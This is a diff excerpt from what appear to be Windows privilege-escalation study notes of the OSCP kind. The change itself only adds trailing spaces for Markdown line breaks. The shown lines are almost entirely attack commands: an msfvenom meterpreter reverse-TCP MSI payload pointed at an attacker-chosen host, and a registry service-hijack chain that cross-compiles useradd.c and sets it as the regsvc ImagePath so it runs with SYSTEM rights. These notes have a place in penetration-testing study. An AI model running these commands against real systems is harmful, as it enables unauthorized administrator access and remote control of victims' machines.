@@ -18,7 +18,7 @@ msfvenom -p windows/meterpreter/reverse_tcp lhost=<ip> lport=<port> -f msi -o <f
 x86_64-w64-mingw32-gcc <filename>.c -o <filename>.exe
  
  #### Service Escalation
-Get-Acl-Path hklm\System\CurrentControlSet\Services\regsvc | fl ~ (NT Authority\Interactive means user has "FullControl" over key)
-[Get useradd.c](https://github.com/codingo/OSCP-2/blob/master/Windows/useradd.c)
-x86_64-w64-mingw32-gcc useradd.c -o mycode.exe
-reg add hklm\System\CurrentControlSet\Services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\mycode.exe /f
+Get-Acl-Path hklm\System\CurrentControlSet\Services\regsvc | fl ~ (NT Authority\Interactive means user has "FullControl" over key)  
+[Get useradd.c](https://github.com/codingo/OSCP-2/blob/master/Windows/useradd.c)  
+x86_64-w64-mingw32-gcc useradd.c -o mycode.exe  
+reg add hklm\System\CurrentControlSet\Services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\mycode.exe /f  
